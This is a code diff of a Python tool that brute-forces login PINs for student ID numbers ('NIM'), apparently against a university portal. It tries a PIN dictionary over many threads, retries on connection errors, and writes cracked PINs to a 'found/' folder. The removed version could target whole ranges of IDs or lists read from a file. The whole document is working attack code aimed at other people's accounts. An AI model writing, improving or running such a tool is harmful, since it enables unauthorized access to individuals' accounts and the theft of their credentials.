@@ -1,27 +1,111 @@
 #!/usr/bin/env python3
 
-import multiprocessing  # Pool, Manager
-import multiprocessing.dummy
-import gc               # gc.collect
-import time             # time.time
-import requests         # request.post
-import logging          # logging
-import os               # os.remove
+import logging
+import requests
+import time
+import os
 
-from SLogin import SLogin
+from multiprocessing.dummy import Pool, Queue, Lock
 from SDict import SDict
+# from SLogin import SLogin
+from ELogin import ELogin
+from tqdm import tqdm
 
 
-def init_logging(logFileName, debug=False):
+class SBrute(object):
+    def __init__(self,
+                 nim: str,
+                 thread: int = 16,
+                 disableProgressBar: bool = False,
+                 start: bool = False):
+
+        self.nim = nim
+        self.thread = thread
+        self.dictionary = SDict(nim)
+        self.session = requests.Session()
+        self.session.mount(
+            'http://', requests.adapters.HTTPAdapter(pool_maxsize=self.thread*2))
+
+        self.progressBar = None
+        if not disableProgressBar:
+            self.progressBar = tqdm(desc=self.nim,
+                                    total=len(self.dictionary))
+
+        self.found = False
+
+        if start:
+            self.start()
+
+    def login(self, pin: str, depth: int = 0, maxRetry: int = 8):
+        try:
+            if self.found:
+                return
+            else:
+                with ELogin(self.nim, pin) as conn:
+                    if conn.login():
+                        self.found = True
+                        return pin
+        except (requests.ConnectTimeout, requests.ConnectionError, requests.exceptions.ChunkedEncodingError) as ex:
+            logging.debug('{} occured {} {}, {} of {} retries'.format(
+                str(ex), self.nim, pin, depth, maxRetry))
+
+            if depth < maxRetry:
+                return self.login(pin, depth+1, maxRetry)
+            else:
+                logging.critical(
+                    'Max Retry Exceeded for this exception: {}'.format(str(ex)))
+                raise ex
+        finally:
+            if depth == 0 and self.progressBar is not None:
+                self.progressBar.update()
+
+    def start(self):
+        self.tStart = time.time()
+
+        try:
+            # check saved pin first
+            try:
+                filename = 'found/{}'.format(self.nim)
+                with open(filename, 'r') as f:
+                    pin = f.read()
+                    logging.info(
+                        'Saved pin found for {}, trying it.'.format(self.nim))
+            except FileNotFoundError:
+                pass
+            else:
+                result = self.login(pin, depth=1)
+                if result == pin:
+                    logging.info('Saved pin is good.')
+                    return
+                else:
+                    logging.warning('Saved pin is bad, trying normal method.')
+                    os.remove(filename)
+
+            with Pool(self.thread) as pool:
+                result = pool.map(self.login, self.dictionary)
+                result = list(set(result))
+                result.remove(None)
+
+            self.result = result
+        finally:
+            self.tEnd = time.time()
+
+            if self.found and self.result is not None:
+                with open('found/{}'.format(self.nim), 'w') as logfile:
+                    logfile.write(self.result[0])
+                logmsg = 'FOUND {} {}'.format(self.nim, self.result[0])
+            else:
+                logmsg = 'FAILED {}' .format(self.nim)
+            logging.info('{} in {:.2f}s'.format(
+                logmsg, self.tEnd - self.tStart))
+
+
+def init_logging(logFileName: str = '', debug: bool = False):
     logFormatter = logging.Formatter(
         fmt="[%(asctime)s][%(levelname)s] %(message)s",
         datefmt='%d-%b-%y %H:%M:%S')
 
     rootLogger = logging.getLogger()
-
-    fileHandler = logging.FileHandler(logFileName, mode='a')
-    fileHandler.setFormatter(logFormatter)
-    rootLogger.addHandler(fileHandler)
 
     consoleHandler = logging.StreamHandler()
     consoleHandler.setFormatter(logFormatter)
@@ -30,163 +114,17 @@ def init_logging(logFileName, debug=False):
     rootLogger.setLevel(logging.DEBUG if debug else logging.INFO)
 
 
-def login(nim, pin, found, counter, depth=0):
-    """Login into specified URL inside this function.
-    Please edit the target and success message
-    in this function declarataion as needed
-    """
-    MAX_RETRY = 64   # please edit this if you need more retry
-
-    logging.debug("Try: nim={} pin={} depth={}".format(nim, pin, depth))
-    if not found.value:
-        try:
-            with SLogin(nim, pin) as connection:
-                if connection.login():
-                    found.value = True
-                    return pin
-        except (requests.ConnectTimeout, requests.ConnectionError, requests.ConnectTimeout) as ex:
-            logging.debug(
-                '{} occured {} {}, {} of {} retries'.format(str(ex), nim, pin, depth, MAX_RETRY))
-            if depth < MAX_RETRY:
-                depth += 1
-                return login(nim, pin, found, counter, depth)
-            else:
-                logging.critical(
-                    'Max Retry Exceeded for this exception: {}'.format(str(ex)))
-                raise ex
-        finally:
-            counter.value = (
-                counter.value + 1) if depth == 0 else counter.value
-
-
-def brute(nim, process_count):
-    start_time = time.time()
-    logging.info('Start bruteforce for {} '.format(nim))
-    found = multiprocessing.Manager().Value('I', 0)
-    counter = multiprocessing.Manager().Value('I', 0)
-
-    # check saved pin first
-    try:
-        filename = 'found/{}'.format(nim)
-        with open(filename, 'r') as f:
-            pin = f.read()
-            logging.info('Saved pin found for {}, trying it.'.format(nim))
-    except FileNotFoundError:
-        pass
-    else:
-        result = login(nim, pin, found, counter)
-        if result == pin:
-            logging.info('Saved pin is good.')
-            return
-        else:
-            logging.warning('Saved pin is bad, trying normal method.')
-            os.remove(filename)
-
-    try:
-        with multiprocessing.Pool(process_count) as pool:
-            result = list(pool.starmap(
-                login, [[nim, pin, found, counter] for pin in SDict(nim)]))
-    except ImportError:
-        with multiprocessing.dummy.Pool(process_count) as pool:
-            result = list(pool.starmap(
-                login, [[nim, pin, found, counter] for pin in SDict(nim)]))
-
-    result = list(set(result))
-    result.remove(None)
-    total_time = time.time() - start_time
-
-    if len(result) == 1:
-        with open('found/{}'.format(nim), 'w') as logfile:
-            logfile.write(result[0])
-            logmsg = 'FOUND {} {}'.format(nim, result[0])
-    else:
-        logmsg = 'FAILED {}' .format(nim)
-    logging.info('{} in {:.2f}s'.format(logmsg, total_time))
-
-
-def parse_argument():
+if __name__ == "__main__":
     import argparse
+    import time
 
     parser = argparse.ArgumentParser()
-    parser.add_argument("--debug",
-                        action="store_true",
-                        default=False,
-                        help="activate debug logging")
-    parser.add_argument("--retry",
-                        metavar="N",
-                        default=4,
-                        type=int,
-                        help="number of max retry if exception occured, default is 4")
-    parser.add_argument("-i", "--infile",
-                        metavar="PATH",
-                        help="txt file containing targets to bruteforce")
-    parser.add_argument("-o", "--outfile",
-                        metavar="PATH",
-                        default="temp.txt",
-                        help="txt file to write if not all target is tried, default is temp.txt")
-    parser.add_argument("-l", "--logfile",
-                        metavar="PATH",
-                        default="log.txt",
-                        help="log file destination")
-    parser.add_argument("-t", "--target",
-                        metavar="TARGET",
-                        type=int,
-                        help="target NIM to bruteforce",
-                        nargs="+")
-    parser.add_argument("--range",
-                        metavar=("START", "END"),
-                        type=int,
-                        nargs=2,
-                        help="range of target NIM to bruteforce, END is included in the range")
-    parser.add_argument("-p", "--process",
-                        metavar="N",
-                        type=int,
-                        default=multiprocessing.cpu_count(),
-                        help="Specify number of process to use, default value is CPU Count. It's more limiting to RAM than CPU.")
-    return parser.parse_args()
+    parser.add_argument("nim", help="NIM to try login")
+    args = parser.parse_args()
 
+    conn = SBrute(args.nim, start=False, disableProgressBar=False)
 
-def main():
-    args = parse_argument()
-    init_logging(args.logfile, args.debug)
-
-    # parse and gather all target
-    target = []
-    done = []
-    if args.infile:
-        try:
-            with open(args.infile, 'r') as filetarget:
-                target += filetarget.read().split('\n')
-        except FileNotFoundError:
-            logging.warning('Input file not found.')
-    if args.target:
-        target += args.target
-    if args.range:
-        target += [n for n in range(args.range[0], args.range[1]+1)]
-    if target == []:
-        logging.critical('Target is empty!')
-        exit(1)
-
-    logging.info("Starting bruteforce with {} process(es) for {} target(s)".format(
-        args.process, len(target)))
-
-    try:
-        for nim in target:
-            brute(nim=nim, process_count=args.process)
-            done.append(nim)
-            gc.collect()
-    except KeyboardInterrupt:
-        logging.info('Interrupted by user input')
-    except Exception as ex:
-        logging.exception('Exception occured: {}'.format(str(ex)))
-    finally:
-        if not len(done) == len(target):
-            logging.info(
-                'Program terminated prematurely. Writing remaining target to temp.txt')
-            with open(args.outfile, 'w') as outfile:
-                outfile.write('\n'.join([str(t)
-                                         for t in target if t not in done]))
-
-
-if __name__ == '__main__':
-    main()
+    tStart = time.time()
+    conn.start()
+    tEnd = time.time()
+    print("Completed in: {:0.2f}".format(tEnd-tStart))
